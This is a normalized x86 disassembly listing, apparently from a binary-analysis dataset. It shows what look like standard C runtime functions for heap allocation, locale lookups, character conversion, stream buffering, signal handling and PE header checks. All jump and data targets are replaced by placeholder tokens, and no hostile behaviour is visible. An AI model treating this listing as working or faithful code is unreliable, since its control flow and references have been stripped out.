pop ecx
pop ecx
sub_40bd63
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_40baf0
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_40bb7f
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_40bc18
pop ecx
sub_40bdb0
push 0xc
push r--data
call sub_4082b0
call sub_406b90
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_40a6c4
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_40bd63
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40be1d
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_406b90
mov esi [ eax + 0x6c ]
mov eax esi
call sub_4082f5
retn
push 0x20
call sub_40828a
sub_40be29
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_40be62
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_405cbc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_405926
push 0x16
pop esi
mov [ eax ] esi
call sub_4058d4
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_405926
mov [ eax ] 0x2a
call sub_405926
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_405926
push 0x22
pop esi
mov [ eax ] esi
call sub_4058d4
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_40a4d0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_40a4d0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40bfd4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_405cbc
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40c01f
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_405cbc
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40bfd4
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_40d2e9
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40c0e0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40c114
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_405926
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_4085c2
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_40c196
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_4055c1
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_405655
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_4085c2
pop ecx
call sub_405926
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_405926
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4058e4
pop ecx
mov [ esi ] eax
push esi
call sub_4085c2
pop ecx
test eax eax
je r-xdata
call sub_405926
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4058e4
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_40c243
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_40c196
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_407f8a
pop ecx
mov ebx eax
call sub_405926
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_40a4d0
add esp 0xc
sub_40c319
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_40c35d
push 0x20
push r--data
call sub_4082b0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_406b17
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_4082f5
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_40c319
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_408256
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_40a6c4
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_4069e0
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c4c4
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_40c520
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_40c560
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40c5b0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_408310
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_40c520
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_40c560
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c66c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_405cbc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_40c01f
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40c6bd
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40c66c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_40c6eb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_405cbc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_40c01f
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40c741
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40c6eb
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_40c771
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_405cbc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_40c01f
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40c7c2
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40c771
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_40c7f0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40b192
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_40b3e6
pop ecx
push eax
call sub_40e42a
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_40b3e6
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_40b3e6
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_40b3e6
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_40b3e6
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_40c912
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_40b3e6
pop ecx
mov edx rw-data
cmp eax edi
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
cmp eax edi
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_40b192
pop ecx
test al 0x2
jne r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_40c9f5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_405cbc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_40bfd4
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_405926
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40cb25
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_4069e0
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40568f
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_40cc91
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405926
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405926
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_4058d4
mov eax esi
sub_40cd06
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_405926
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_405926
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_4058d4
mov eax esi
jmp r-xdata
sub_40cdd3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_40cdee
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405926
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405926
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_4058d4
mov eax esi
sub_40ce51
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
